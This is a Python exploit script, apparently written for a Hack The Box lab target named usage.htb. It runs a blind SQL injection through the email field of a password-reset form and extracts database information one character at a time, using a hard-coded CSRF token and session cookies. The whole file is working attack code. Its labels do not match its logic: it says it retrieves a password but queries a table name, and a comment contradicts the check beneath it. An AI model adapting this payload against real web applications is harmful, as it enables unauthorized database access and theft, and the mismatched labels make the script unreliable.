import sys
import requests
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxy configuration if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    for i in range(1, 11):  # Assuming the password length is exactly 10 characters long
        found = False
        for j in range(65, 127):  # ASCII printable characters range
            sqli_payload = f"admin23@gmail.com' AND (SELECT CASE WHEN (SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema = 'usage_blog' LIMIT 1 OFFSET 0), {i}, 1) = '{chr(j)}') THEN 'true' ELSE 'false' END) = 'true' -- -"
            form_data = {
                '_token': 'lkk1QFyuV5BfZLIka9wBqVK7iFJOxkCI8aXj8FBa',
                'email': sqli_payload
            }
            headers = {
                "Host": "usage.htb",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "http://usage.htb",
                "Connection": "close",
                "Referer": "http://usage.htb/forget-password",
                "Upgrade-Insecure-Requests": "1",
                "Cookie": "XSRF-TOKEN=eyJpdiI6IlV3bkdiNFhoSUtKM3QyQWhNcWg3akE9PSIsInZhbHVlIjoiR1RObGdPV21jMFlwdFdOOGsxWUYzdDRuVDFaZVdRbTJZaTkyTHFUZEdvR1ZmREpNSjRvVFRuckwxR3hZRzNkRWdXdFVSUmV3bWxielQxdm5IWDZNM2RCOUhqRmlObUhVRFMydXZWbEZsRExtTHZ3d011MmpWWWFHaWFBQkJ5L24iLCJtYWMiOiIyMzhiNGQxZmI4MGQ0YmRiYjVmNzRhMmM4NGM3NDk2OWNkNzY1MWUyZWJhMGJiZTBhOTRjMjg3YmM1NGE3YmZkIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlFDMlljSHRwTXFaNTV1VkN6MjlnOGc9PSIsInZhbHVlIjoiK0R1VlIzeWJETTFuQVhtcU5hZWFCaWkyRkpaWm9GcklhdUJIdDNkKzhQQkZjMS80UE94UFdpNlFQRm1DQ1ZZdVJnNEcxQlZ1MEdWMzVLTjhBamFGQXNibDFEcHgyaWZMUHZQd3c5ZVkvOXBaNVJFL1VOOUNoNmlwTnlrZkpWRjUiLCJtYWMiOiIyOGJlZTBkNGJkN2JkY2NlZGVlN2VkMmJhZWRkYTI1YjFjMGNjYjIzODc0MmM2ZGQ3NjM2ODYwYTg3YmM0YWVkIiwidGFnIjoiIn0%3D"
            }
            response = requests.post(url, data=form_data, headers=headers, verify=False, proxies=proxies, allow_redirects=True)
            if "We have e-mailed your password reset link to admin23@gmail.com" in response.text:  # Check if email address is NOT in response text
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                found = True
                break
            
            if not found:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
                continue


    print("\n(+) Password extraction completed.")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s http://example.com" % sys.argv[0])
        sys.exit(1)

    url = sys.argv[1]
    print("(+) Retrieving password...")
    sqli_password(url)

if __name__ == "__main__":
    main()